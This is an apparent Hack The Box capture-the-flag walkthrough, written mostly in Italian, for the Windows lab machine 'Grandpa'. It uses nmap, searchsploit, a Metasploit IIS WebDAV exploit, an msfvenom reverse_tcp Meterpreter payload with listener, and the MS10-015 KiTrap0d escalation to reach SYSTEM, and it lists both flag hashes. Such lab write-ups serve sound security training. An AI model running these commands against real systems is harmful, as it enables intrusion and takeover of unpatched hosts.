Grandpa - Hack The Box Writeup
Machine Information
Field	Value
Machine Name	Grandpa
Difficulty	Easy
OS	Windows
IP	10.129.2.116
Enumeration
Nmap Scan

L’enumerazione iniziale è stata effettuata tramite nmap per identificare servizi e possibili vettori di attacco.

nmap -sC -sV -O 10.129.2.116

L’analisi ha evidenziato la presenza di un server Microsoft IIS con WebDAV attivo.

Servizi Identificati
Porta	Servizio	Descrizione
80/tcp	HTTP (Microsoft IIS)	Web server IIS
WebDAV	HTTP Extension	Gestione file tramite HTTP

WebDAV su IIS rappresenta un possibile vettore di attacco su sistemi Windows non aggiornati.

Exploitation
Vulnerability Research

La ricerca degli exploit è stata eseguita tramite searchsploit.

searchsploit iis webdav

È stato identificato un exploit relativo a Microsoft IIS WebDAV in grado di permettere esecuzione di codice remoto su sistemi vulnerabili.

Metasploit Exploitation

Avvio di Metasploit Framework:

msfconsole

Configurazione dell’exploit:

set lport 4444
run

L’esecuzione ha portato all’ottenimento di una sessione Meterpreter iniziale.

Stabilizing the Shell

La shell iniziale risultava instabile, quindi è stato tentato il migration verso un processo più stabile.

ps
ps davcdata
migrate <pid>

La stabilità non è stata sufficiente, quindi si è proceduto alla creazione di un payload alternativo.

Generazione Payload Stabile

Creazione di un eseguibile Windows tramite msfvenom:

cd ~/Desktop

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<lhost> LPORT=5555 -f exe -o shell.exe

Upload del payload sulla macchina target:

upload /home/kali/Desktop/shell.exe C:\\WINDOWS\\Temp\\shell.exe

Nota: su Windows è necessario utilizzare il doppio backslash \\.

Multi/Handler Setup

Configurazione del listener:

msfconsole -q

use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.15.161
set lport 5555
run

Esecuzione del payload:

execute -f C:\\WINDOWS\\Temp\\shell.exe

Si ottiene una nuova sessione Meterpreter stabile.

Privilege Escalation

La sessione è stata messa in background per enumerazione locale:

background
search local_exploit
Kernel Exploit (MS10-015 Kitrap0d)

Utilizzo del modulo locale:

use exploit/windows/local/ms10_015_kitrap0d
set session <session-id>
set lhost <lhost>
set lport 3000
run

L’exploit sfrutta una vulnerabilità del kernel Windows (KiTrap0D), consentendo escalation dei privilegi fino a SYSTEM.

Post Exploitation
SYSTEM Access

Dopo l’exploit è stata ottenuta una shell con privilegi elevati:

NT AUTHORITY\SYSTEM
Flags
User Flag (Harry)

La user flag è stata trovata nell’account dell’utente:

harry
bdff5ec67c3cff017f2bedc146a5d869
Root Flag (Administrator)

La root flag è stata recuperata nell’account:

administrator
9359e905a2c35f861f6a57cecf28bb7b
